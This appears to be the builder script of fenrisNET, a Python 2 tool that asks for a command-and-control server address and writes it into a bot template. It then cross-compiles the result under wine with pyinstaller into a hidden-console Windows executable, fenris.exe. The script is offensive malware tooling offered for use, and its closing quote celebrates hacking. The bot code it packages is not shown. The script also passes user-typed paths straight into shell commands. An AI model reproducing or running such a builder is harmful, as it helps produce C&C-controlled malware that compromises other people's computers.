#!/usr/bin/python

########################################################################
# Copyright 2015 Daniel Haake
#
# This file is part of fenrisNET
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################


import os
from tools.tools import tools
import sys
import signal


myTool = tools()
usageString = "Usage: " + sys.argv[0] + myTool.blue  + " <options>" + myTool.stop


def ctrlc_handler(self, frm):
        print myTool.green + "\n\n[+] " + myTool.stop + "Good bye!"
        print "*** Remember: \"A hacker should only be limited by his imagination and not by his tools.\"\n"
        sys.exit(0)

if len(sys.argv) < 2:
	sys.exit(usageString + "\n-h: help menu")
else:
	signal.signal(signal.SIGINT, ctrlc_handler)

	# help menu
	if "-h" in sys.argv or "--help" in sys.argv:
		print usageString
		print myTool.blue + "[-cf|--create-fenris]" + myTool.stop + "\tCreate a wild fenris."
		print myTool.blue + "[-h|--help]" + myTool.stop + "\t\tDisplays this help menu."		
		print myTool.blue + "[-s|--setup]" + myTool.stop + "\t\tPerform setup."
		print ""
		sys.exit()

	if "-cf" in sys.argv or "--create-fenris" in sys.argv:
		candc = raw_input("# C&C-server: ")
		# update fenris.py
		f = open("fenrisTemplate.py", "r")
		newFileContent = ""
		for line in f.readlines():
			if "[DUMMYCANDC]" in line:
				line = "candc = \"" + candc + "\"\n"
			newFileContent += line
		f.close()
		f = open("fenris.py", "w")
		f.write(newFileContent)
		f.close()
		# cross compile...
		virtualEnvWine = raw_input("# Virtual wine environment root-path: ")
		pyinstaller = raw_input("# pyinstaller.py root-path: ")
		os.system(". " + virtualEnvWine + "/bin/activate; wine c:/Python27/python.exe " + pyinstaller + " -w -a -F fenris.py")
		print myTool.green + "[+]" + myTool.stop + " fenris.exe saved into dist/ folder."
		sys.exit()
	if "-s" in sys.argv or "--setup" in sys.argv:
		setupParameter = ""
		while(setupParameter != "p" and setupParameter != "e" and setupParameter != "c"):
			setupParameter = raw_input("# setup variant(permissions(p), environment(e), complete(c)): ")
			# permissions
			if setupParameter == "p":
				os.system("python setup.py -p")
			# environment
			if setupParameter == "e":
				os.system("python setup.py -e")
			# complete
			if setupParameter == "c":
				os.system("python setup.py -c")
			# wrong input
			if setupParameter != "p" and setupParameter != "e" and setupParameter != "c":
				print myTool.fail + "[-]" + myTool.stop + "Wrong input! (choose one of: p, e, c)"
